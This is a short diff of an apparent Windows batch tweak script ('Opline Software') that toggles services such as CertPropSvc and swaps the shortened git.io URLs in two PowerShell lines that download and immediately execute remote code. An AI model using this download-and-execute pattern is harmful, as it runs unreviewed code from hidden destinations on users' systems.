@@ -1544,7 +1544,7 @@ sc start "CertPropSvc"
 sc config "CertPropSvc" start= auto
 sc start "PeerDistSvc"
 sc config "PeerDistSvc" start= auto
-Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JSidU'))
+Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JSPXn'))
 cls
 SET msgboxTitle=Opline Software
 SET msgboxBody=Finished - Skonczone
@@ -1727,7 +1727,7 @@ sc stop "CertPropSvc"
 sc config "CertPropSvc" start= disabled
 sc stop "PeerDistSvc"
 sc config "PeerDistSvc" start= disabled
-Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JSidL'))
+Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JSPXJ'))
 cls
 SET msgboxTitle=Opline Software
 SET msgboxBody=Finished - Skonczone
